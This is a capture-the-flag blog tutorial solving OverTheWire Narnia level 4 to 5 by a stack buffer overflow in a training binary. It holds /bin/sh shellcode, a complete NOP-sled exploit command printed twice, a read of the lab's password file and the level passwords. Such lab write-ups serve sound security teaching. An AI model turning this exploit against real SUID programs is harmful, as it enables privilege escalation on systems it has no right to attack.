---
date: 2023-08-22 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Narnia Level 4 → 5 tutorial!!"
permalink: /posts/Over-The-Wire-Narnia-Level-4-to-5/
tags: [overthewire, narnia, pwn, overflow, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Narnia Level 4 → 5!!"
---

<!-- Scoped styles -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Narnia level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Narnia-Level-3-to-4/' | relative_url }}">← Previous: Level 3 → 4</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/narnia/narnia5.html" target="_blank" rel="noopener">Official (Level 5) ↗</a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Narnia-Level-5-to-6/' | relative_url }}">Next: Level 5 → 6 →</a>
  </div>
</nav>

## Login

Use the password from Level 3→4 (in my run it was `thaenohtai`):

```bash
ssh narnia4@narnia.labs.overthewire.org -p 2226
# password: thaenohtai
````

---

## Task

We have a binary **`/narnia/narnia4`**. Running it shows nothing:

```bash
cd /narnia
./narnia4
# (no output, just exits)
```

So we’ll check the source.

---

## Source Code

```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc, char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc > 1)
        strcpy(buffer,argv[1]);

    return 0;
}
```

### Analysis

* A 256-byte local buffer.
* `strcpy(buffer, argv[1]);` → no bounds check.
* So input longer than 256 will overflow and overwrite the saved return address.
* `environ` is cleared → shellcode in env vars is useless this time.
* We must inject **our shellcode directly via argv**.

---

## A little bit of Theory

* **Offset to RET**: 256 (buffer) + 4 (saved EBP) = **260 bytes**.
* Payload: `NOP sled + shellcode + padding + RET`.
* `RET` must point **inside the sled** (avoid `\x00`).
* Use `setarch i386 -R env -i` to disable ASLR and keep env empty (so addresses match inside & outside GDB).

**Shellcode**: standard 23-byte `/bin/sh`:

```python
b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
b"\x68\x2f\x62\x69\x6e"
b"\x89\xe3\x89\xc1\x89\xc2"
b"\xb0\x0b\xcd\x80"
```

---

## Solution

### 1) Confirm offset

```bash
gdb /narnia/narnia4
(gdb) run $(python3 -c 'print("A"*260 + "BBBB")')
```

EIP shows `0x42424242` → confirmed RET offset.

---

### 2) Find return address

Set a breakpoint after `strcpy`:

```gdb
(gdb) break *main+121
(gdb) run $(python3 -c 'print("A"*260)')
(gdb) x/200x $esp-400
```

You’ll see a **big NOP sled** in memory (0x90 bytes). Choose an address right in the middle, e.g. `0xffffd7b4`.

---

### 3) Exploit with sled + shellcode

```bash
setarch i386 -R env -i /narnia/narnia4 "$(python3 - <<'PY'
import sys,struct
SLED  = b"\x90"*236
SHELL = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
         b"\x68\x2f\x62\x69\x6e"
         b"\x89\xe3\x89\xc1\x89\xc2"
         b"\xb0\x0b\xcd\x80")
PAD   = b"\x90"*(260 - len(SLED) - len(SHELL))
RET   = 0xffffd7b4   # pick from your GDB dump
sys.stdout.buffer.write(SLED+SHELL+PAD+struct.pack("<I",RET))
PY
)"
```

---

### 4) Verify

```bash
whoami
# narnia5
cat /etc/narnia_pass/narnia5
```

---

## Password

From my run:

```
faimahchiy
```

Yours may differ depending on snapshot.

---

## Troubleshooting

* **Segfault immediately** → RET wrong. Redo `x/200x $esp-400` and pick another address inside the NOP block.
* **Illegal instruction** → your sled too small; expand to 200+ NOPs.
* **Still as narnia4** → confirm binary is SUID narnia5:

```bash
ls -l /narnia/narnia4
# -r-sr-x--- 1 narnia5 narnia4 ...
```

* **Payload truncated** → Always use `sys.stdout.buffer.write(...)` in Python 3 (never `print`).

---

## Copy-paste quick run

```bash
setarch i386 -R env -i /narnia/narnia4 "$(python3 - <<'PY'
import sys,struct
SLED  = b"\x90"*236
SHELL = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
         b"\x68\x2f\x62\x69\x6e"
         b"\x89\xe3\x89\xc1\x89\xc2"
         b"\xb0\x0b\xcd\x80")
PAD   = b"\x90"*(260 - len(SLED) - len(SHELL))
RET   = 0xffffd7b4
sys.stdout.buffer.write(SLED+SHELL+PAD+struct.pack("<I",RET))
PY
)"
whoami
cat /etc/narnia_pass/narnia5
```

---

**Congrats 🎉** You exploited another classic **stack buffer overflow** with argv injection. Onward to **Level 5 → 6**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

